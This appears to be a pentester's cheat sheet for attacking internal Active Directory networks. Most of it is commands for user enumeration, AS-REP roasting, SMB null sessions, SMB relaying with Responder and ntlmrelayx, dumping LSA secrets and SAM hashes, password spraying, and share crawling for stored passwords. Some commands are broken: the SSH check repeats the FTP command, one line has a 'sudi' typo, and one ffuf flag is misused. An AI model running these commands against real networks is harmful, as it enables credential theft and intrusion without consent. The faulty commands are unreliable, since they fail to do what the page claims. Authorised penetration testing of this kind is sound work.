# Internal (Kali)

Starting with some [NMap Scans/Scripts](../tools/nmap.md) we can find plenty of other information for more targeted attacks and finding other attack paths/vectors. Then depending if we were given user credentials to perform a "compromised user" approach, we can go down other paths, but either way we would want to check for all of these with and without credentials.

***

## User Enumeration

Without already being given user credentials, we can try to find some using [Kerbrute](https://github.com/ropnop/kerbrute/releases), and [GetNPUsers.py](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py). These methods can be loud but still effective.

* [Kerbrute](https://github.com/ropnop/kerbrute/releases) - A little louder

```
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
```

```
./kerbrute_linux_amd64 userenum -d DOMAIN --dc DC-IP USERLIST.txt -v -o Outfile.txt
```

* [GetNPUsers.py](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py) - Can be stealthy but not always.

```
GetNPUsers.py DOMAIN/ -usersfile USERLIST.txt -dc-ip DC-IP -no-pass
```

## SMB Null Sessions

I like to use [SMBCrunch](https://github.com/Raikia/SMBCrunch)(SMBHunt.pl), and [Netexec](https://github.com/Pennyw0rth/NetExec)

* [SMBCrunch](https://github.com/Raikia/SMBCrunch)

```
git clone https://github.com/Raikia/SMBCrunch.git && cd SMBCrunch
```

```
sudo ./smbhunt.pl -i ../445.txt
```

* [Netexec](https://github.com/Pennyw0rth/NetExec)

```
sudi netexec smb <target-ip> -u "" -p "" --shares
```

* View Null sessions with

```
sudo smbclient -L //target/share -U ""
```

## SMB Relays

If SMB Signing is not Required for multiple machines, we can attempt to abuse SMB Relays with [Responder](https://github.com/lgandx/Responder), [NTLMRelayX](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) (From Impacket), and [Proxychains](https://github.com/haad/proxychains).

1. Disable SMB and HTTP in Responder.conf (/etc/responder/Responder.conf):

```bash
sudo sed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf
```

```bash
sudo sed -i 's/HTTP = On/HTTP = Off/g' /etc/responder/Responder.conf
```

2. Change the proxychains config (/etc/proxychains4.conf)

```bash
sudo sed -i 's/9050/1080/g' /etc/proxychains4.conf
```

4. Use [NetExec](https://github.com/Pennyw0rth/NetExec) to generate a list of hosts that has SMB signing not required (--gen-relay-list)

```bash
sudo netexec smb up-hosts.txt --gen-relay-list relay.txt
```

5. Run [Responder](https://github.com/lgandx/Responder)

```
sudo python3 /usr/share/responder/Responder.py -I eth0 -PDv --lm
```

6. Run [NTLMRelayX](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) in a new window/tab while Responder is running.

```
sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -tf relay.txt -socks -smb2support -i -of relyed-hashes.txt
```

When we have capture relays, we can try and crack the captured hashed, but while we crack them we can abuse the relays using [NetExec](https://github.com/Pennyw0rth/NetExec).

* View Shares hosted on target machine

```bash
sudo proxychains4 netexec smb ip -u user -p '' --shares
```

* Dump LSA

```
sudo proxychains4 netexec smb ip -u user -p '' --lsa
```

Dump SAM hashes

```
sudo proxychains4 netexec smb ip -u user -p '' --sam
```

## General Enumeration

Finding Domain Controller IP. These aren't guaranteed but can be used in most cases.

* Using NSLookup

```
nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>
```

* Using DIG

```
dig _ldap._tcp.dc._msdcs.<domain> SRV
```

* Checking /etc/resolv.conf

```
cat /etc/resolv.conf
```

### Web Services

* Look at all http/https pages for login pages, information disclosure, default login credentials, robots.txt, and other directories.
* [Ffuf](https://github.com/ffuf/ffuf)&#x20;
  * Will need a fuzzling wordlist list, such as [Seclists](https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content)

```
sudo ffuf -recursion -mc all -ac -c -e https://domain/FUZZ -w wordlist.txt
```

```
sudo ffuf -recursion -mc all -ac -c -e .htm,.shtml,.php,.html,.js,.txt,.zip,.bak,.asp,.aspx,.xml -w wordlist.txt -u https://domain/FUZZ -fc 400,401,403,404,406,500,502 > domain.txt
```

### FTP

Checking if FTP is open, and if anonymous login is enabled.

```
sudo nmap -p 21 --script ftp-anon -iL 21.txt
```

### SSH

Checking  if SSH is open and if it takes password authentication.

```
sudo nmap -p 21 --script ftp-anon -iL 21.txt
```

***

## Password Spraying

### SMB

* [SMBSpray](https://github.com/absolomb/smbspray)

```
git clone https://github.com/absolomb/smbspray.git && cd smbspray
```

```
python3 smbspray.py -u users.txt -p passwords.txt -ip DC-IP
```

### SSH

* Using [hydra](https://github.com/vanhauser-thc/thc-hydra)

```
hydra -L users.txt -P passwords.txt ssh://<target_ip>
```

***

## Post Exploitation

Once we have obtained credentials we can find even more info. I like to find more info from: [LDAPDomainDump](https://github.com/dirkjanm/ldapdomaindump), Bloodhound ([Bloodhound.py](http://bloodhound.py/)), and [Manspider](https://github.com/blacklanternsecurity/MANSPIDER).

### Bloodhound / [Bloodhound-Python](http://bloodhound.py/)

```bash
sudo bloodhound-python -u USER -p PASSWORD -ns DNS Server -d DOMAIN -c All
```

Once we have the .json files, we can ingest them into bloodhound to look for domain admins, kerberoastable accounts, and more.

### [LDAPDomainDump](https://github.com/dirkjanm/ldapdomaindump)

```bash
sudo ldapdomaindump -u DOMAIN\\USER -p PASSWORD IP
```

### [ManSpider](https://github.com/blacklanternsecurity/MANSPIDER)

Crawl network shares to find any helpful info, such as files with cleartext passwords, password databases, and more.

* Install

```
pipx install git+https://github.com/blacklanternsecurity/MANSPIDER
```

* Search hostname/IP for files with "passw" in the name:

```
manspider TARGET -f passw -d DOMAIN -u USER -p 'PASSWORD'
```

* Search for documents containing passwords

```
manspider TAGRGET -c passw -d DOMAIN -u USER -p 'PASSWORD'
```
